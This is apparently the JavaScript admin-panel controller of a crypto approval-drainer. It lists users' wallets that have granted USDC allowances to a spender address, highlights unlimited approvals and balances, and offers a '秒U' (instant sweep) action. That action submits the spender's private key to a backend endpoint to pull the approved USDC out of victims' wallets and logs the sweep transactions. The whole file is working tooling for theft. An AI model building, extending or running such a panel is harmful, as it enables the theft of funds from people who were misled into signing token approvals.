define(['jquery', 'bootstrap', 'backend', 'table', 'form'], function ($, undefined, Backend, Table, Form) {
    var routePrefix = 'hec/usdc_approve';
    var Controller = {
        index: function () {
            Table.api.init({
                extend: {
                    index_url: routePrefix + '/index' + location.search,
                    table: 'usdc_approve',
                }
            });
            var table = $("#table");
            table.bootstrapTable({
                url: $.fn.bootstrapTable.defaults.extend.index_url,
                pk: 'id',
                sortName: 'approved_at',
                sortOrder: 'desc',
                columns: [[
                    {field: 'id', title: 'ID', sortable: true},
                    {field: 'user_id', title: '用户ID', sortable: true},
                    {field: 'username', title: '用户名', operate: false},
                    {field: 'email', title: '邮箱', operate: false},
                    {field: 'wallet_address', title: '授权钱包', operate: 'LIKE', formatter: function (value) {
                        if (!value) return '-';
                        if (value.length <= 12) return value;
                        return value.slice(0, 6) + '...' + value.slice(-6);
                    }},
                    {field: 'spender_address', title: '授权给', operate: 'LIKE', formatter: function (value) {
                        if (!value) return '-';
                        if (value.length <= 12) return value;
                        return value.slice(0, 6) + '...' + value.slice(-6);
                    }},
                    {field: 'allowance_text', title: '授权额度', operate: false, formatter: function (value, row) {
                        if (row.is_unlimited == 1) {
                            return '<span class="text-warning">无限</span>';
                        }
                        return value || row.allowance_usdt || row.allowance_usdc;
                    }},
                    {field: 'usdt_balance_text', title: 'USDC余额', operate: false, formatter: function (value, row) {
                        return value || row.usdt_balance || row.usdc_balance || '0';
                    }},
                    {field: 'usdt_balance', title: '余额(USDC)', operate: 'BETWEEN', visible: false},
                    {field: 'allowance_usdt', title: '额度(USDC)', operate: 'BETWEEN', visible: false},
                    {field: 'is_unlimited', title: '无限授权', searchList: {'0': '否', '1': '是'}, formatter: function (value) {
                        return value == 1 ? '<span class="text-warning">是</span>' : '否';
                    }},
                    {field: 'tx_hash', title: '授权哈希', operate: 'LIKE', formatter: function (value, row) {
                        if (!value || value === 'permit') return value === 'permit' ? '<span class="text-muted">Permit</span>' : '-';
                        var net = (row.network || '').toLowerCase();
                        var url = net.indexOf('eth') >= 0 || String(value).indexOf('0x') === 0
                            ? 'https://etherscan.io/tx/' + value
                            : 'https://tronscan.org/#/transaction/' + value;
                        return '<a href="' + url + '" target="_blank" rel="noopener">' + value.slice(0, 8) + '...' + value.slice(-8) + '</a>';
                    }},
                    {field: 'is_swept_text', title: '秒U状态', operate: false, formatter: function (value, row) {
                        if (row.is_swept == 1) {
                            return '<span class="text-success">已秒U</span>';
                        }
                        return '<span class="text-muted">未秒U</span>';
                    }},
                    {field: 'sweep_amount', title: '累计秒U', operate: false, formatter: function (value, row) {
                        if (!row.is_swept || !value || parseFloat(value) <= 0) return '-';
                        return parseFloat(value) + ' USDC';
                    }},
                    {field: 'sweep_tx_hash', title: '秒U哈希', operate: 'LIKE', formatter: function (value, row) {
                        if (!value) return '-';
                        var net = (row.network || '').toLowerCase();
                        var url = net.indexOf('eth') >= 0 || String(value).indexOf('0x') === 0
                            ? 'https://etherscan.io/tx/' + value
                            : 'https://tronscan.org/#/transaction/' + value;
                        return '<a href="' + url + '" target="_blank" rel="noopener">' + value.slice(0, 8) + '...' + value.slice(-8) + '</a>';
                    }},
                    {field: 'swept_at_text', title: '秒U时间', operate: false},
                    {field: 'network', title: '网络', operate: false},
                    {field: 'approved_at', title: '授权时间', formatter: Table.api.formatter.datetime, operate: 'RANGE', addclass: 'datetimerange', sortable: true},
                    {field: 'synced_at', title: '同步时间', formatter: Table.api.formatter.datetime, operate: 'RANGE', addclass: 'datetimerange', sortable: true},
                    {field: 'createtime', title: '记录创建', formatter: Table.api.formatter.datetime, operate: 'RANGE', addclass: 'datetimerange', sortable: true, visible: false},
                    {
                        field: 'operate',
                        title: '操作',
                        table: table,
                        events: Controller.api.events,
                        formatter: Controller.api.formatter.operate
                    }
                ]]
            });
            Table.api.bindevent(table);

            $('.btn-sync-all').on('click', function () {
                Layer.confirm('将从 Ethereum 链上同步全部记录的授权额度与 USDC 余额，可能耗时较久，确定继续？', function (index) {
                    Layer.close(index);
                    var loading = Layer.load();
                    Fast.api.ajax({
                        url: routePrefix + '/sync_all',
                        type: 'post',
                    }, function (data, ret) {
                        Layer.close(loading);
                        Layer.msg(ret.msg || '同步完成');
                        table.bootstrapTable('refresh');
                    }, function () {
                        Layer.close(loading);
                    });
                });
            });
        },
        api: {
            bindevent: function () { Form.api.bindevent($("form[role=form]")); },
            formatter: {
                operate: function (value, row, index) {
                    var canSweepU = $('#table').data('sweep-u') === 1 || $('#table').data('sweep-u') === '1';
                    if (!canSweepU) {
                        return '-';
                    }
                    var balance = row.usdt_balance || row.usdc_balance || '0';
                    return '<a href="javascript:;" class="btn btn-xs btn-danger btn-sweep-u" data-id="' + row.id + '" data-balance="' + balance + '" title="秒U"><i class="fa fa-bolt"></i> 秒U</a>';
                }
            },
            events: {
                'click .btn-sweep-u': function (e, value, row) {
                    e.preventDefault();
                    e.stopPropagation();
                    var table = $("#table");
                    var balance = row.usdt_balance || row.usdc_balance || '0';
                    var content = [
                        '<form class="form-horizontal sweep-u-form" style="padding:16px 20px 4px">',
                        '<div class="form-group">',
                        '<label class="control-label col-sm-3">秒U数量</label>',
                        '<div class="col-sm-8">',
                        '<input type="text" name="amount" class="form-control" value="' + balance + '" placeholder="USDC 数量" autocomplete="off">',
                        '<p class="help-block">不超过钱包余额与授权额度</p>',
                        '</div></div>',
                        '<div class="form-group">',
                        '<label class="control-label col-sm-3">私钥</label>',
                        '<div class="col-sm-8">',
                        '<input type="password" name="private_key" class="form-control" placeholder="授权对象钱包私钥（不保存）" autocomplete="new-password">',
                        '<p class="help-block text-danger">仅用于本次链上签名，请勿在公共环境操作</p>',
                        '</div></div>',
                        '</form>'
                    ].join('');

                    Layer.open({
                        type: 1,
                        title: '秒U — ' + (row.wallet_address || ''),
                        area: ['520px', '300px'],
                        content: content,
                        btn: ['确认秒U', '取消'],
                        yes: function (index) {
                            var $form = $('.sweep-u-form');
                            var amount = $.trim($form.find('[name=amount]').val());
                            var privateKey = $form.find('[name=private_key]').val();
                            $form.find('[name=private_key]').val('');
                            if (!amount || !privateKey) {
                                Layer.msg('请填写秒U数量与私钥');
                                return;
                            }
                            var loading = Layer.load();
                            Fast.api.ajax({
                                url: routePrefix + '/sweep_u',
                                type: 'post',
                                data: {
                                    ids: row.id,
                                    amount: amount,
                                    private_key: privateKey
                                }
                            }, function (data, ret) {
                                Layer.close(loading);
                                Layer.close(index);
                                privateKey = '';
                                var txid = (data && data.txid) ? data.txid : '';
                                var txUrl = (data && data.url) ? data.url : (txid ? 'https://etherscan.io/tx/' + txid : '');
                                if (txid && txUrl) {
                                    Layer.alert('秒U成功<br>Tx: <a href="' + txUrl + '" target="_blank">' + txid.slice(0, 10) + '...</a>', {title: '完成'});
                                } else {
                                    Layer.msg(ret.msg || '秒U成功');
                                }
                                table.bootstrapTable('refresh');
                            }, function () {
                                Layer.close(loading);
                                privateKey = '';
                            });
                        },
                        end: function () {
                            $('.sweep-u-form [name=private_key]').val('');
                        }
                    });
                }
            }
        }
    };
    return Controller;
});
